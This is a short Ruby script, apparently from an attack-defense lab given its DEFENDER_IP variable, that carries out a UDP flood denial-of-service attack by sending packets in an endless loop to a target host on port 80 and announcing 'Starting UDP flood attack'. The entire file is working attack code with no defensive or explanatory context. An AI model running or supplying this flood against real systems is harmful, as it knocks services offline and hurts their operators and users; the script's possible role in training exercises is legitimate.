require 'socket'

# Set the target IP address and port
target_ip = ENV['DEFENDER_IP']
target_port = 80

# Create a UDP socket
socket = UDPSocket.new

puts "Starting UDP flood attack on #{target_ip}:#{target_port}"

# Send UDP packets in a loop
loop do
  socket.send('DATA', 0, target_ip, target_port)
end
